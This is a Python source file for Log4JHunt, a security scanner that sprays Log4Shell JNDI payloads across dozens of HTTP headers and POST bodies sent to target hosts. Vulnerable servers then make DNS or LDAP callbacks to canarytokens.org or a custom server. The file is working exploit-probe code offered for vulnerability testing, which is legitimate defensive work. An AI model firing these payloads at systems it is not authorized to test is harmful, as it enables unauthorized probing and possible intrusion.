#!/usr/bin/env python3
# -*- coding: utf-8 -*-

#:-:--:--:--:--:--#
#    Log4JHunt    #
#:-:--:--:--:--:--#

# Author: Pinaki Mondal (@0xInfection)
# This file is a part of the Log4JHunt tool meant for testing of
# hosts vulnerable to the Log4Shell vulnerability.

import os, sys, datetime, time
import argparse, requests, urllib3, json

delay = 0
timeout = 7
proxies = dict()
allhosts = list()
methods = ['GET']
default_headers = [
    "A-IM", "Accept", "Accept-Charset", "Accept-Datetime", "Accept-Encoding",
    "Accept-Language", "Access-Control-Request-Method", "Access-Control-Request-Headers",
    "Authorization", "Cache-Control", "Content-Encoding", "Content-MD5", "Content-Type",
    "Cookie", "Date", "Expect", "Forwarded", "From", "HTTP2-Settings", "If-Match",
    "If-Modified-Since", "If-None-Match", "If-Range", "If-Unmodified-Since",
    "Max-Forwards", "Origin", "Pragma", "Prefer", "Proxy-Authorization", "Range", "Referer",
    "TE", "Trailer", "Transfer-Encoding", "User-Agent", "Upgrade", "Via", "Warning",
    "Upgrade-Insecure-Requests", "X-Requested-With", "DNT", "X-Forwarded-For", "X-Correlation-ID",
    "X-Forwarded-Host", "X-Forwarded-Proto", "Front-End-Https", "X-ATT-DeviceId",
    "X-Wap-Profile", "Proxy-Connection", "X-UIDH", "X-Csrf-Token", "X-Request-ID", "X-Api-Version",
]
custom_payload = r"${jndi:dns://${hostname}.%s}"
canary_payload = r"${jndi:ldap://x${hostName}.L4J.%s.canarytokens.com/a}"
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_token(email: str, webhook: str):
    '''
    Generate a token automatically
    '''
    if not email:
        email = ''
    if not webhook:
        webhook = ''
    hbody = '''------WebKitFormBoundaryTTwFOEyKMZZffBne
Content-Disposition: form-data; name="type"

log4shell
------WebKitFormBoundaryTTwFOEyKMZZffBne
Content-Disposition: form-data; name="email"

%s
------WebKitFormBoundaryTTwFOEyKMZZffBne
Content-Disposition: form-data; name="webhook"

%s
------WebKitFormBoundaryTTwFOEyKMZZffBne
Content-Disposition: form-data; name="fmt"


------WebKitFormBoundaryTTwFOEyKMZZffBne
Content-Disposition: form-data; name="memo"

[Log4JHunt] Log4Shell Token Triggered!
------WebKitFormBoundaryTTwFOEyKMZZffBne
Content-Disposition: form-data; name="clonedsite"


------WebKitFormBoundaryTTwFOEyKMZZffBne
Content-Disposition: form-data; name="sql_server_table_name"

TABLE1
------WebKitFormBoundaryTTwFOEyKMZZffBne
Content-Disposition: form-data; name="sql_server_view_name"

VIEW1
------WebKitFormBoundaryTTwFOEyKMZZffBne
Content-Disposition: form-data; name="sql_server_function_name"

FUNCTION1
------WebKitFormBoundaryTTwFOEyKMZZffBne
Content-Disposition: form-data; name="sql_server_trigger_name"

TRIGGER1
------WebKitFormBoundaryTTwFOEyKMZZffBne
Content-Disposition: form-data; name="redirect_url"


------WebKitFormBoundaryTTwFOEyKMZZffBne--''' % (email, webhook)
    hheaders = {
        "User-Agent":       "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0",
		"Accept":           "application/json, text/javascript, */*; q=0.01",
        "Content-Type":     "multipart/form-data; boundary=----WebKitFormBoundaryTTwFOEyKMZZffBne",
		"X-Requested-With": "XMLHttpRequest",
		"Origin":           "https://canarytokens.org",
		"Accept-Encoding":  "gzip, deflate, br",
		"Accept-Language":  "en-GB,en-US;q=0.9,en;q=0.8",
		"Referer":          "https://canarytokens.org/generate",
		"Sec-Fetch-Site":   "same-origin",
		"Sec-Fetch-Mode":   "cors",
		"Sec-Fetch-Dest":   "empty",
	}
    try:
        resp = requests.post(
            'http://canarytokens.org/generate',
            data=hbody,
            proxies=proxies,
            headers=hheaders,
            timeout=5,
            verify=False
        )
    except requests.exceptions.RequestException as err:
        sys.exit('Error getting Canary Token:', err.__str__())

    if resp is not None:
        with open('canary-token.json', 'w') as wf:
            json.dump(resp.json(), wf, indent=2)

        return resp.json()['Token'], resp.json()['Auth']

def gen_headers(payload: str, headers: str, user_agent: str):
    '''
    Generates request headers with payloads
    '''
    xheaders = dict()
    if not headers:
        for xhead in default_headers:
            xheaders[xhead] = payload
    else:
        for xhead in headers.split(','):
            xheaders[xhead.strip()] = payload
    if user_agent:
        xheaders['User-Agent'] = user_agent
    return xheaders

def gen_post_data(payload: str):
    '''
    Generates body based payload for POST requests
    '''
    return {'s': payload}

def scan_host(host: str, headers: dict, params: dict):
    '''
    Scans a single host for the vulnerability
    '''
    for method in methods:
        if method == 'POST' or method == 'PUT' or method == 'PATCH':
            try:
                requests.request(
                    method=method,
                    url=host,
                    params=params,
                    data=params,
                    headers=headers,
                    timeout=timeout,
                    proxies=proxies,
                    verify=False
                )
                time.sleep(delay)
            except requests.exceptions.RequestException as err:
                continue
        else:
            try:
                requests.request(
                    method=method,
                    url=host,
                    params=params,
                    headers=headers,
                    timeout=timeout,
                    proxies=proxies,
                    verify=False
                )
                time.sleep(delay)
            except requests.exceptions.RequestException:
                continue

def main():
    print('''
          +--------------+
              Log4JHunt
          +--------------+

[+] Log4JHunt by RedHunt Labs - A Modern Attack Surface (ASM) Management Company
[+] Author: Pinaki Mondal (RHL Research Team)
[+] Continuously Track Your Attack Surface using redhuntlabs.com/nvadr.
    ''')
    parser = argparse.ArgumentParser(prog='log4jhunt.py')
    parser.add_argument('-u', '--url', dest='url', type=str, help='URL to probe for the vulnerability.')
    parser.add_argument('-f', '--file', dest='file', type=str, help='Specify a file containing list of hosts to scan.')
    parser.add_argument('-d', '--delay', dest='delay', type=str, help='Delay in-between two concurrent requests.')
    parser.add_argument('-t', '--timeout', dest='timeout', type=int, help='Scan timeout for a single host.')
    parser.add_argument('-T', '--token', dest='token', type=str, help='Canary token to use in payloads for scanning.')
    parser.add_argument('-E', '--email', dest='email', type=str, help='Email to receive notifications.')
    parser.add_argument('-W', '--webhook', dest='webhook', type=str, help='Webhook URL to receive notifications.')
    parser.add_argument('-S', '--server', dest='server', type=str, help='Custom DNS callback server for receiving notifications.')
    parser.add_argument('-ua', '--user-agent', dest='useragent', type=str, help='Custom user agent string to use for requests.')
    parser.add_argument('-m', '--methods', dest='method', type=str, help='Comma separated list of HTTP Method to use')
    parser.add_argument('-H', '--headers', dest='headers', help='Comma separated list of custom HTTP headers to use.')
    parser.add_argument('-p', '--proxy', dest='proxy', help='HTTP proxy to use (if any).')

    args = parser.parse_args()

    if args.url:
        allhosts.append(args.url)

    if args.file:
        if not os.path.exists(args.file):
            print('[-] File %s doesn\'t exist!' % args.file)
            parser.print_help(sys.stdout)
            sys.exit(1)
        else:
            with open(args.file, 'r') as rf:
                allhosts.extend(rf.read().splitlines())

    if len(allhosts) < 1:
        print('[-] You have to supply at least a single host to scan!\n')
        parser.print_help(sys.stdout)
        sys.exit(1)

    if args.delay:
        global delay
        delay = args.delay

    if args.timeout:
        global timeout
        timeout = args.timeout

    if args.method:
        global methods
        methods = list(set(
            [i.upper().strip() for i in args.method.split(',')]
            )
        )

    if args.proxy:
        global proxies
        proxies = {
            "http":  args.proxy,
            "https": args.proxy
        }

    xpayload, authtoken = '', ''
    if args.server:
        xpayload = custom_payload % args.server

    if args.token:
        xpayload = canary_payload % args.token

    if len(xpayload) < 1:
        print('[-] No canarytokens or server given. Generating a new payload...')
        if not args.email or args.webhook:
            print('[-] You have to supply either an email or a webhook if not mentioning a canarytoken or a custom server!\n')
            parser.print_help()
            sys.exit(1)
        ctoken, authtoken = get_token(args.email, args.webhook)
        xpayload = canary_payload % ctoken
        print('[-] Got a new canarytoken:', ctoken)

    xheaders = gen_headers(xpayload, args.headers, args.useragent)
    xbody = gen_post_data(xpayload)

    tnow = datetime.datetime.now()
    print('[+] Started scan at:', tnow.strftime("%m/%d/%Y, %H:%M:%S"))

    for host in allhosts:
        if not '://' in host:
            host = 'http://%s' % host
        print('[*] Processing:', host)
        scan_host(host, xheaders, xbody)

    tfin = datetime.datetime.now()
    print('[+] Scan finished at:', tfin.strftime("%m/%d/%Y, %H:%M:%S"))
    print('[+] Please check your canarytoken history / callback server for DNS triggers from vulnerable hosts.')
    if len(authtoken) > 0:
        print('[+] Visit "%s" for viewing callbacks!' %
            f'https://canarytokens.org/history?token={ctoken}&auth={authtoken}')
    print('[+] Total time taken: %ss' % (tfin-tnow).total_seconds())
    print('[*] Done. Log4JHunt is exiting...')

if __name__ == '__main__':
    main()